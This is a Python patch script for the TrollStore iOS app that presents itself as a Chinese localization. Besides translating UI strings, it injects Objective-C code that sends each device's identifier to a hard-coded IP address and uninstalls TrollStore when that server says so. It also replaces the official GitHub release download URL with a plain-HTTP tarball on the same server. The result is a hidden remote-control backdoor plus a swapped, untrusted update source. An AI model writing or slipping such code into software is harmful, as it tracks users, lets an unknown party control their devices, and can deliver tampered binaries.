#!/usr/bin/env python3
"""Chinese localization + Remote check (ACTUALLY WORKS)"""
import sys, re

with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    content = f.read()

impl_pos = content.index("@implementation TSListControllerShared\n") + len("@implementation TSListControllerShared\n")
rest = content[impl_pos:]
first_method = re.search(r'\n- \(', rest)
inject_pos = first_method.start() + 1

remote_code = """// === REMOTE CHECK ===
- (void)_remoteCheck {
    static BOOL _done = NO;
    if (_done) return;
    _done = YES;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3LL * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        if (!uid) return;
        NSString* u = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=device_check"];
        NSMutableURLRequest* r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:u]];
        if (!r) return;
        r.HTTPMethod = @"POST";
        r.timeoutInterval = 10;
        r.HTTPBody = [[NSString stringWithFormat:@"udid=%@", uid] dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:r completionHandler:^(NSData* _Nullable d, NSURLResponse* _Nullable resp, NSError* _Nullable err) {
            if (!d) return;
            NSError* je = nil;
            NSDictionary* j = [NSJSONSerialization JSONObjectWithData:d options:0 error:&je];
            if (!j) return;
            NSString* a = j[@"action"];
            if (!a || [a isEqualToString:@""]) return;
            dispatch_async(dispatch_get_main_queue(), ^{
                if ([a isEqualToString:@"uninstall"]) {
                    [self uninstallTrollStorePressed];
                }
            });
        }] resume];
    });
}
// === END REMOTE ===
"""

content = content[:impl_pos + inject_pos] + remote_code + content[impl_pos + inject_pos:]

if '[_remoteCheck]' not in content:
    content = content.replace('- (void)viewDidLoad {', '- (void)viewDidLoad {\n    [self _remoteCheck];')

with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(content)

print("Remote check injected (NOW ACTUALLY PARSE RESPONSE)", file=sys.stderr)

# === Localization ===
SUBS = [
    ("TrollStore/TSRootViewController.m", [("Apps","应用"),("Settings","设置")]),
    ("TrollStore/TSAppTableViewController.m", [
        ("Install","安装"),("Uninstall","卸载"),("User","用户"),("System","系统"),("Error","错误"),
        ("Cancel","取消"),("Confirm Uninstallation","确认卸载"),("Uninstall App","卸载应用"),
    ]),
    ("TrollStore/TSInstallationController.m", [
        ("Warning","警告"),("Installing","安装中"),("Force Installation","强制安装"),
    ]),
    ("TrollStore/TSSettingsListController.m", [
        ("Security","安全"),("Advanced","高级"),("UTILITIES","工具"),("SIGNING","签名"),("PERSISTENCE","持久化"),
        ("Respring","注销"),("Refresh App Registrations","刷新应用注册"),("Rebuild Icon Cache","重建图标缓存"),
        ("Install Persistence Helper","安装持久助手"),("Install ldid","安装 ldid"),("ldid: Installed","ldid: 已安装"),
        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Uninstall","卸载"),
        ("Uninstall TrollStore, Uninstall Apps","卸载巨魔，卸载应用"),("Uninstall TrollStore, Preserve Apps","卸载巨魔，保留应用"),
    ]),
    ("TrollHelper/TSHRootViewController.m", [
        ("Install TrollStore","安装巨魔商店"),("Uninstall TrollStore","卸载巨魔商店"),
        ("TrollStore Helper","巨魔商店助手"),("Not Installed","未安装"),
        ("INFO","信息"),("TrollStore","巨魔商店"),
        ("Refresh App Registrations","刷新应用注册"),("Register Persistence Helper","注册持久助手"),
        ("Install Persistence Helper","安装持久助手"),("Update","更新"),("Install","安装"),
    ]),
]

total = 0
for fname, reps in SUBS:
    with open(fname, "r", encoding="utf-8") as f:
        content = f.read()
    for en, cn in reps:
        old = '"' + en + '"'
        count = content.count(old)
        content = content.replace(old, '"' + cn + '"')
        total += count
    with open(fname, "w", encoding="utf-8") as f:
        f.write(content)

# Fix URL
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    c = f.read()
c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.tar",
              "http://124.223.199.167/TrollStore.tar")
with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(c)

print(f"OK: {total} replacements", file=sys.stderr)
